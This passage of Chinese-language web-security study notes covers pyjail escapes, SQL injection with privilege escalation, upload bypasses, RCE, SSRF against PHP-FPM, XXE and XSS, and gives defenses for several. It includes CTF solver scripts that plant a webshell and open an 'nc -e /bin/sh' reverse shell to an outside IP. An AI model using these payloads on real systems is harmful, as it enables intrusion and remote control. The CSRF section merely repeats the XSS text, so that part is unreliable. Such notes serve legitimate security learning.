src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154233610.png" alt="image-20240610154233610"></p><p>warnings类的子类linecache引入了os<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154308261.png" alt="image-20240610154308261"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610154324692.png" alt="image-20240610154324692"></p><p>也就是先获取warnings再获取linecache再到os</p><h2 id="行数限制"><a href="#行数限制" class="headerlink" title="行数限制"></a>行数限制</h2><p>exec中\n换行</p><p>empile</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612121536686.png" alt="image-20240612121536686"></p><p>海象表达式</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612121545670.png" alt="image-20240612121545670"></p><h2 id="help"><a href="#help" class="headerlink" title="help()"></a>help()</h2><p>随便进一个模块 #！或者！sh  </p><p>server</p><p>locals</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612104521484.png" alt="image-20240612104521484"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>过滤. [截图] :_<em>getitem</em>_  pop()</p><p>python3.6:PEP498<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610155737068.png" alt="image-20240610155737068"></p><p>__globals__：func_globals</p><p>_<em>mro__： _<em>bases</em></em> _<em>base</em>_</p><p>引号：str</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612115730113.png" alt="image-20240612115730113"></p><p>数字：<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612120104791.png" alt="image-20240612120104791"></p><p>fromhex frombytes</p><p>_<em>doc</em>_:从帮助文档获取字符</p><p>dict(list())转换为字符串</p><p>内建函数</p><h2 id="特殊利用"><a href="#特殊利用" class="headerlink" title="特殊利用"></a>特殊利用</h2><p>byte函数：type(str(1).encode)</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240612104158931.png" alt="image-20240612104158931"></p><p>抛出异常：raise OSError</p><p>unicode注入</p><p>eval(input)绕过输入长度限制</p><p>breakpoint提起时期</p><p><a href="https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkI5YW1fwfRmD#toc-9">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/mumuhhh/p/17811377.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>pyhon</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>top10漏洞</title>
    <link href="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/27/top10%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="OWASP-10"><a href="#OWASP-10" class="headerlink" title="OWASP-10"></a>OWASP-10</h1><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/TXA5bTle4oxg5TxfrqHcq0Z9nne.jpg"></p><h1 id="Sql-注入"><a href="#Sql-注入" class="headerlink" title="Sql 注入"></a>Sql 注入</h1><p><a href="https://mp.weixin.qq.com/s/frwK49IatUqUoT-4DR08GQ">https://mp.weixin.qq.com/s/frwK49IatUqUoT-4DR08GQ</a></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/CSnebxG6woM5WCx1hk9cmtbCnkh.png"></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/EzmPbr01Oo7NAlxHNWVcRtW5nnd.png"></p><p>绕过方式</p><p>大小写 双写 空格 内敛注释 url 编码 十六进制 逗号 比较符 注释符 宽字节</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/OFxLbMlvaoD62vxKoyscZuoHnDf.png"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span> 是mysql对xml文档数据进行查询和修改的xpath函数 <br><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span> 是mysql对xml文档数据进行查询的xpath函数 <br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span> mysql中用来取整的函数 <br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">()</span></span> 此函数返回<span class="hljs-built_in">e</span>(自然对数的底)指数X的幂值<br></code></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">()</span></span> 计算md5<br>Get_lock函数<br></code></pre></td></tr></table></figure><p><a href="https://www.gem-love.com/2022/01/26/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9AMySQL%E7%9B%B2%E6%B3%A8/">一文搞定 MySQL 盲注 | 颖奇 L’Amore (gem-love.com)</a></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>mysql 数据库采用宽字节编码（GB2312、GBK、GB18030、BIG5、Shift_JIS）同时与服务器不一致并且存在转义函数的时候</p><p>root %df’ or 1&#x3D;1 #</p><p>原理:在 GBK 编码中,反斜杠的编码是 %5c,在输入 %df’后，单引号前添加反斜杠后形成 %df%5c，而 %df%5c 是繁体字“連”，单引号成功逃逸</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/XZBHbKWeYo93CixzZEUcFTBWn6b.png"></p><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><p>预编译</p><p>限制长度</p><p>加 WAF</p><p>通信加密</p><p>其中预编译：</p><p>因为 sql 注入是因为动态字符串的拼接导致 sql 命令发生改变，然后编译并且执行错误的结果。</p><p>而 sql 预处理则是提前“告诉”sql 语法处理器，提前声明并且编译特定格式的 sql 语句，然后将所有用户的输入视为纯字符串参数，最后组成查询语句。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入</p><h4 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h4><p>在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p><h2 id="写-shell"><a href="#写-shell" class="headerlink" title="写 shell"></a>写 shell</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1.绝对路径且读写</p><p>2.数据库权限</p><p>3.secure_file_priv（可日志绕过）</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/LxKEbLIeGoKwLQx0NqAcCTBfnNb.png"></p><p>4.防止命令执行：<code>disable_functions</code>，禁止了 <code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用 dl 扩展执行命令或者 ImageMagick 漏洞<br>其中 <code>open_basedir</code>: 将用户可操作的文件限制在某目录下</p><blockquote><p><a href="https://blog.csdn.net/xhy18634297976/article/details/119486812">https://blog.csdn.net/xhy18634297976/article/details/119486812</a></p></blockquote><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="函数写入"><a href="#函数写入" class="headerlink" title="函数写入"></a>函数写入</h4><blockquote><p>into outfile<br>dumpfile<br>file_put_content</p></blockquote><p>1.outfile 和 dumpfile 区别？</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/EKxjbOgbloC83kxDPFlcRuGDn1c.png"></p><p>2.outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html">https://www.cnblogs.com/milantgh/p/5444398.html</a></p><p>3.dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p><h4 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h4><p>全局日志：开启后将日志路径指定为网站绝对路径下的一个文件，执行木马语句自动写入,绕过 secure_file_priv&#x3D;0</p><h4 id="MSSQL-差异备份"><a href="#MSSQL-差异备份" class="headerlink" title="MSSQL 差异备份"></a>MSSQL 差异备份</h4><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/S1LebIjIToCo2FxRcHvce1SQnXg.png"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>where：limit 1,1</p><p>limit: group by having 条件</p><p>逗号：</p><p>limit处的逗号：limit 1 offset 1</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627105613676.png" alt="image-20240627105613676"></p><p>单引号：需要两个注入点，例如账号输入1\就能将后面的单引号转义再在密码处进行注入</p><p>select：盲注，仅限当前表，可堆叠的话赋值变量为16进行</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><blockquote><p><a href="https://www.freebuf.com/articles/web/264790.html">https://www.freebuf.com/articles/web/264790.html</a></p></blockquote><p>udf 提权，mof 提权，启动项提权</p><p>前提：<strong>system 运行</strong> mysql root 权限 可执行 sql 语句（不过滤 into outfile 这种语句）</p><p>获取 root 密码：1.配置文件 2.数据文件 3.爆破</p><h4 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h4><p>低版本 win 下自动运行的文件，在可写目录下写入执行语句然后 outfile 到 mof 文件（<code>C:\Windows\System32\wbem\MOF</code> 目录下的 <code>nullevt.mof</code>）中</p><h4 id="udf-提权"><a href="#udf-提权" class="headerlink" title="udf 提权"></a>udf 提权</h4><p>UDF(User Defined Funtion)用户自定义函数可以调用 dll 文件语句，将恶意 dll 文件导入 myslq 中并执行（linux 是 so 文件）</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/AdtebJP5foOLgexWJotccK0Fn5f.png"></p><p>3.启动项提权</p><p>4.反弹端口连接提权</p><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>4.xp_cmdshell 提权</p><p>拥有 shell 或者 sql 可执行命令的时候，利用 cmdshell 组件默认的 system 权限</p><p>5.sp_oacreate 提权</p><h2 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h2><p>前端控制回显，限制语句长度，waf，加密，预编译，黑白名单</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="防护-3"><a href="#防护-3" class="headerlink" title="防护"></a>防护</h3><p>前端控制回显，限制语句长度，waf，加密，预编译，黑白名单</p><h3 id="GPC"><a href="#GPC" class="headerlink" title="GPC"></a>GPC</h3><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/KU2WboPHMoDfRAxFuAqcYZoznCg.png"></p><h3 id="mysql-版本"><a href="#mysql-版本" class="headerlink" title="mysql 版本"></a>mysql 版本</h3><p>5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名。</p><p>5.0 以下是多用户单操作，5.0 以上是多用户多操作</p><h3 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h3><p>预编译sql模板，sql和参数分两次</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="防护：JS，黑白名单，mime"><a href="#防护：JS，黑白名单，mime" class="headerlink" title="防护：JS，黑白名单，mime"></a>防护：JS，黑白名单，mime</h3><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>1.%00：文件名后缀.php%00.jpg</p><p>2.0x00:post 传参时</p><p>3.图片马</p><p>4.条件竞争（先上后检测）</p><p>5.文件名改造（替换，大小写，换行，编码，参数污染，异常闭合）</p><p>6.请求方式</p><p>7.分块参数 + 参数污染</p><p>8.长度字段</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/DeBRbvFl2okFpkxIbicc8be2nzh.png"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240628102144418.png" alt="image-20240628102144418"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><blockquote><p><a href="https://xiaolong22333.top/archives/201/">https://xiaolong22333.top/archives/201/</a><br><a href="https://blog.csdn.net/miuzzx/article/details/125148989">https://blog.csdn.net/miuzzx/article/details/125148989</a><br><a href="https://www.sohu.com/a/208155480_354899">https://www.sohu.com/a/208155480_354899</a></p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/SQJAbQ1guo7jeYxgpbVclhhqnEf.png"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.文件名写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>    data=&#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>:payload<br>    &#125;<br>    requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>        writeFile(p.strip())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>        time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>    <span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    run()<br>    check()<br>    <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;main&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>2.php 临时上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>import time<br><br>url = <span class="hljs-string">&quot;http://538ae548-ca26-4dfc-af73-ded632f3b6be.challenge.ctf.show/&quot;</span><br><br><br>def <span class="hljs-title function_ invoke__">getShell</span>(payload):<br>    data=&#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>:payload<br>    &#125;<br>    file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:b<span class="hljs-string">&quot;#!/bin/sh\nnc 47.100.137.45 2233 -e /bin/sh&quot;</span><br>    &#125;<br>    requests.<span class="hljs-title function_ invoke__">post</span>(url,data=data,files=file)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br>def <span class="hljs-title function_ invoke__">run</span>():<br>    <span class="hljs-title function_ invoke__">getShell</span>(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br>def <span class="hljs-title function_ invoke__">main</span>():<br>    <span class="hljs-title function_ invoke__">run</span>()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">main</span>()<br></code></pre></td></tr></table></figure><p>3.dir 写入</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240628101433951.png" alt="image-20240628101433951"></p><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h2><p>IP进制转换</p><p>ip省略写法,[::]绕过localhost</p><p>dns解析</p><p><a href="mailto:&#x75;&#114;&#x6c;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#x75;&#114;&#x6c;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;</a></p><h2 id="防护-4"><a href="#防护-4" class="headerlink" title="防护"></a>防护</h2><p>ip转换为整数</p><p>urllib.parse</p><h2 id="SSRF-利用-fastcgi-攻击"><a href="#SSRF-利用-fastcgi-攻击" class="headerlink" title="SSRF 利用 fastcgi 攻击"></a>SSRF 利用 fastcgi 攻击</h2><p>之前做 ctf 题也运用过工具，但是不了解原理</p><blockquote><p><a href="https://blog.csdn.net/weixin_39664643/article/details/114977217">https://blog.csdn.net/weixin_39664643&#x2F;article&#x2F;details&#x2F;114977217</a></p></blockquote><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="CGI-FASTCGI-PHP-CGI-PHP-FPM"><a href="#CGI-FASTCGI-PHP-CGI-PHP-FPM" class="headerlink" title="CGI&#x2F;FASTCGI&#x2F;PHP-CGI&#x2F;PHP-FPM"></a>CGI&#x2F;FASTCGI&#x2F;PHP-CGI&#x2F;PHP-FPM</h4><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/MZZsbzpqxoYnIzxXzd1cPnIanHe.png"></p><blockquote><p>PHP-CGI 与 PHP-FPM 是一个接口程序<br>CGI&#x2F;FASTCGI 是服务器中间件与某个语言后端（如 PHP-FPM）之间的协议，可以将他们与客户端和服务器之间的 http 等协议做类比，网站服务器收到数据之后会根据是否是静态文件来决定需不需要给予 php 解析器来处理</p></blockquote><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/GqwUb9kLUoW4JUxEQAZcSLmqn5q.png"></p><h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher 协议"></a>gopher 协议</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br></code></pre></td></tr></table></figure><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:gopher</span><span class="hljs-symbol">://&lt;host&gt;</span><span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-variable constant_">TCP</span>数据流<br></code></pre></td></tr></table></figure><h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>1.抓取一个 tcp 数据包</p><p>2.bp url 全编码</p><p>3.拼接格式</p><h4 id="FASTCGI-协议详解"><a href="#FASTCGI-协议详解" class="headerlink" title="FASTCGI 协议详解"></a>FASTCGI 协议详解</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件<br></code></pre></td></tr></table></figure><p>结构如下，头固定八个字节，body 由头中的 contentLength 决定</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/ZUy4b98iaoLw1DxXSdHcA3lOnPf.png"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>区别：</p><p>一个是 PHP-FPM 直接暴露在外网会收到我们的攻击，一个是在内网需要 ssrf(gopher 协议)进一步利用</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>PHP 版本要高于 5.3.3，才能动态修改 PHP.INI 配置文件（题目环境已满足）</li><li>知道题目环境中的一个 PHP 文件的绝对路径</li><li>PHP-FPM 监听在本机 9000 端口（题目环境已满足）</li></ul><h4 id="FASTCGI-攻击-PHP-FPM"><a href="#FASTCGI-攻击-PHP-FPM" class="headerlink" title="FASTCGI 攻击 PHP-FPM"></a>FASTCGI 攻击 PHP-FPM</h4><blockquote><p>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 FastCGI 协议，和 FPM 进行通信。<br>我们可以自己构造 FASTCGI 数据包控制 SCRIPT_FILENAME 来让 PHP-FPM 执行任意文件</p></blockquote><p>问题</p><p>利用方案</p><p>例子如下</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/NVUubeBtMoWJNGxtP3ocHzChnue.png"></p><h4 id="SSRF-攻击-PHP-FPM"><a href="#SSRF-攻击-PHP-FPM" class="headerlink" title="SSRF 攻击 PHP-FPM"></a>SSRF 攻击 PHP-FPM</h4><p>利用工具 gopherus 在 ssrf 利用点直接攻击即可，其原理同上</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a><strong>常见场景</strong></h2><p>pdf 在线解析、word 在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让 XML 作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用 DTD、Entity。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a><strong>危害</strong></h2><p>读取本地文件，执行系统命令，探测内网端口，攻击内网服务探测内网端口的协议有 gopher file dict，不同语言支持不同的协议，是具体情况而定，file http ftp 是常用的</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a><strong>防范</strong></h2><p>python 用 lxml 时可以对 resolve_entities 设为 false。或者过滤用户提交的 xml,客户端也可以有 xxe，有的网站会使用 office 打开 docx 进行解析<br>Java 解析 XML 的常用三方库，如果不禁用 DTD、Entity 都会导致 XXE 漏洞：</p><blockquote><p>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><p>存储型XSS： 你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； </p><p>反射型XSS： 你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； </p><p>DOM型XSS： 你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p><h2 id="防护-5"><a href="#防护-5" class="headerlink" title="防护"></a>防护</h2><p>前端过滤字符</p><p>后端白名单</p><p>http-only</p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/IQa7btkGGoPGVnxQSkfcHAKAnLY.png"></p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="输出到href标签"><a href="#输出到href标签" class="headerlink" title="输出到href标签"></a>输出到href标签</h3><p>payload：javascript:alert(“hello!!!”) </p><p>防护：限制http（s）头，进行htmlspecialchars转义</p><h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>浏览器内容安全策略，减少xss攻击</p><h3 id="如何绕过Http-only？"><a href="#如何绕过Http-only？" class="headerlink" title="如何绕过Http-only？"></a><strong>如何绕过Http-only？</strong></h3><blockquote><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p></blockquote><h2 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/ZTSkbHaYwoLld8xhZUGcQj6onxf.png"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="防护-6"><a href="#防护-6" class="headerlink" title="防护"></a>防护</h2><p>前端过滤字符</p><p>后端白名单</p><p>http-only</p><h2 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h2><h3 id="输出到href标签-1"><a href="#输出到href标签-1" class="headerlink" title="输出到href标签"></a>输出到href标签</h3><p>payload：javascript:alert(“hello!!!”) </p><p>防护：限制http（s）头，进行htmlspecialchars转义</p><h3 id="CSP策略-1"><a href="#CSP策略-1" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>浏览器内容安全策略，减少xss攻击</p><h3 id="如何绕过Http-only？-1"><a href="#如何绕过Http-only？-1" class="headerlink" title="如何绕过Http-only？"></a><strong>如何绕过Http-only？</strong></h3><blockquote><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p></blockquote><h1 id="其他-3"><a href="#其他-3" class="headerlink" title="其他"></a>其他</h1><p>CORS，JSONP，Websocket都可以用来绕过SOP策略</p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p><strong>相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</strong></p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解 - 阮一峰的网络日志 